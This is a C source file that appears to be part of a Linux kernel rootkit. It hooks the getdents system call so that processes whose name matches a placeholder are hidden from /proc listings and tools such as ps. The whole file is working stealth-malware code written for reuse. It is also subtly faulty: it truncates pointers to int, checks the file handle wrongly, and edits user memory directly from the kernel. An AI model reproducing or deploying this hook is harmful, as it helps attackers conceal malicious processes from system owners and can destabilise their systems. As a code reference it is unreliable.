#include "syscalls.h"
#include "list.h"


asmlinkage long (*original_getdents) (const struct pt_regs *);
asmlinkage long sys_getdents_hook(const struct pt_regs * regs)
{
	int rtn;
	int i = 0;
	struct linux_dirent *cur = (struct linux_dirent *)regs->si;
	rtn = original_getdents(regs);
	while(i < rtn){
		if(findchar(cur->d_name, strlen(cur->d_name))){
				char proc_path[128];
				strcpy(proc_path, "/proc/");
				strcat(proc_path, cur->d_name);
				strcat(proc_path, "/comm");
				struct file *f;
				f = filp_open(proc_path, O_RDONLY, 0);
				if(f > 0){
					loff_t offset = 0;
					mm_segment_t fs;
					fs = get_fs();
					set_fs(KERNEL_DS);
					char name[128];
					vfs_read(f, name, 128, &offset);
					set_fs(fs);
					filp_close(f,NULL);
					name[11] = '\0';
					if (strcmp("[Your process name here]", name) == 0) {
						int reclen = cur->d_reclen;
			    			char *next_rec = (char *)cur + reclen;
			    			int len = (int)regs->si + rtn - (int)next_rec;
			    			memmove(cur, next_rec, len);
			    			rtn -= reclen;
			    			continue;
					}	
				}
				
		}
		i += cur->d_reclen;
        	cur = (struct linux_dirent *) ((char*)regs->si + i);
	}
	return rtn;
}
